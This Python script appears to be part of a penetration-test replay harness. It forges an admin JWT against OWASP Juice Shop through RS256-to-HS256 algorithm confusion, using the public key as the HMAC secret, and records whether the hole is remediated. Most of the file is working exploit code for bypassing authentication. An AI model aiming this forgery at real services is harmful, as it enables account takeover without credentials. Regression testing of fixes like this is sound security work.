#!/usr/bin/env python3
"""pt06: JWT algorithm confusion, forging an admin session with no login.

Juice Shop signs real tokens with RS256, using a private key. But its
verification path (build/lib/insecurity.js's updateAuthenticatedUsers)
calls jsonwebtoken.verify(token, publicKey, callback) with no
`algorithms` restriction. A token forged as HS256, signed using the
RSA PUBLIC key (checked into the open-source repo, and extractable from
any running container) as an HMAC secret, verifies successfully: the
library doesn't check that RS256's public key was never meant to double
as an HS256 shared secret.

This item's blueprint commits the actual public key (blueprints/jwt.pub)
pulled from the running container, so the forgery is reproducible
without depending on GitHub or a live docker exec.

Standard library only (urllib, hmac, hashlib, base64, json).
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt06-001.json"


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _forge_hs256_token(public_key: bytes, claims: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "status": "success",
        "data": {
            "id": claims["id"],
            "username": "",
            "email": claims["email"],
            "role": claims["role"],
            "deluxeToken": "",
            "lastLoginIp": "",
            "profileImage": "assets/public/images/uploads/defaultAdmin.png",
            "totpSecret": "",
            "isActive": True,
        },
        "iat": int(time.time()),
    }
    signing_input = f"{_b64url(json.dumps(header, separators=(',', ':')).encode())}.{_b64url(json.dumps(payload, separators=(',', ':')).encode())}"
    signature = hmac.new(public_key, signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{_b64url(signature)}"


def _get(url: str, token: str) -> tuple[int, dict]:
    req = urllib.request.Request(url, method="GET")
    req.add_header("Cookie", f"token={token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_login(target: str) -> str:
    stamp = str(int(time.time() * 1000))
    email = f"pt06-{stamp}@flatline.test"
    password = "Pt06Pass123!"
    data = json.dumps({"email": email, "password": password, "passwordRepeat": password}).encode()
    req = urllib.request.Request(f"{target}/api/Users", data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    urllib.request.urlopen(req, timeout=10).read()

    login_req = urllib.request.Request(
        f"{target}/rest/user/login",
        data=json.dumps({"email": email, "password": password}).encode(),
        method="POST",
    )
    login_req.add_header("Content-Type", "application/json")
    login_body = json.loads(urllib.request.urlopen(login_req, timeout=10).read())
    return login_body["authentication"]["token"], email


def run(target: str, blueprint: dict, public_key_path: Path) -> dict:
    ledger.guard_target_host(target)

    public_key = public_key_path.read_bytes()
    forged_token = _forge_hs256_token(public_key, blueprint["forged_claims"])

    exploit_status, exploit_body = _get(f"{target}{blueprint['endpoint']}", forged_token)
    exploit_email = exploit_body.get("user", {}).get("email")

    if exploit_status in (401, 403):
        status = "REMEDIATED"
        summary = f"Forged token blocked with HTTP {exploit_status}."
    elif exploit_status == 200 and exploit_email == blueprint["forged_claims"]["email"]:
        status = "VULNERABLE"
        summary = f"Forged HS256 token (signed with the RS256 public key) authenticated as {exploit_email} with no prior login."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, email={exploit_email!r}."

    real_token, real_email = _register_and_login(target)
    legit_status, legit_body = _get(f"{target}{blueprint['endpoint']}", real_token)
    legitimate_real_session_ok = legit_status == 200 and legit_body.get("user", {}).get("email") == real_email

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "legitimate_real_session_ok": legitimate_real_session_ok,
        "legitimate_real_session_http_status": legit_status,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint_path = Path(args.blueprint)
    blueprint = json.loads(blueprint_path.read_text())
    target = args.target or blueprint["target"]["host"]
    public_key_path = blueprint_path.parent / blueprint["public_key_file"]

    result = run(target, blueprint, public_key_path)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt06-jwt-algorithm-confusion", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
